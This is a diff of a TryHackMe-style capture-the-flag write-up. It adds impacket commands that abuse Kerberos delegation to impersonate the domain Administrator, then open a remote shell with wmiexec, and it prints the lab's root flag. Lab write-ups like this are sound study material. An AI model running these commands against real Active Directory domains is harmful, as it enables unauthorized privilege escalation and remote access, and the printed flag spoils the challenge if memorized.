@@ -11,7 +11,8 @@ Due to the fact the machine has AV turned on this is the easier way of do the jo
 
 - Run on the attacking machine:
 
-	`impacket-getST -spn cifs/haystack.thm.corp -impersonate Administrator thm.corp/DARLA_WINTERS:'Password@4444'`
+	`impacket-getST -spn cifs/HAYSTACK.THM.CORP -impersonate Administrator "thm.corp/DARLA_WINTERS:Password@2022" -dc-ip <MACHINE IP`
+
 	
 	![[Screenshot from 2024-08-18 13-10-03.png]]
 	The ticket is save in Administrator.ccache file.
@@ -20,5 +21,14 @@ Due to the fact the machine has AV turned on this is the easier way of do the jo
 
 	`export KRB5CCNAME=Administrator.ccache'
 
+- Run `impacket-wmiexec`.
+	`impacket-wmiexec -no-pass -k thm.corp/administrator@HAYSTACK.THM.CORP`
 
+	![[Screenshot from 2024-08-20 11-46-09.png]]
 
+- Run `whoami`.
+	![[Screenshot from 2024-08-20 11-48-59.png]]
+
+- Go to `C:\users\Administrator\Desktop>` and run type `root.txt`.
+	You'll get root's flag.
+	THM{RE_RE_RE_SET_AND_DELEGATE}
